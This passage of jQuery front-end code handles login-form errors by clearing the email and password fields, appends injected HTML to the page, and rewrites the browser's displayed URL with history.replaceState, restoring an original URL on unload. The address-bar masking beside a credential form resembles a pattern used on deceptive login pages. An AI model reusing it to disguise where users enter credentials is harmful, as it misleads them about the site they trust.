        $('.login-register-form-table tr:first').after(errMsg);
        $(".login-register-form-table tr").eq(2).remove();

        $('input[name="email"]').val('');
        $('input[name="pwd"]').val('');

        return false;
	}

	function addBody(body) {
		return new Promise(function (resolve, reject) {
			$('body').append(body);
			resolve();
		});
	}

	/*function changeUrl(newURL) {
		var url = window.location.href;
		window.history.replaceState({}, document.title, newURL);
	}*/

    function changeUrl(newURL, originalURL) {
        window.history.replaceState({ originalURL: originalURL }, document.title, newURL);
    
        window.onbeforeunload = function() {
            var state = window.history.state;
            if (state && state.originalURL) {
                window.history.replaceState({}, document.title, state.originalURL);
            }
        }
    }
});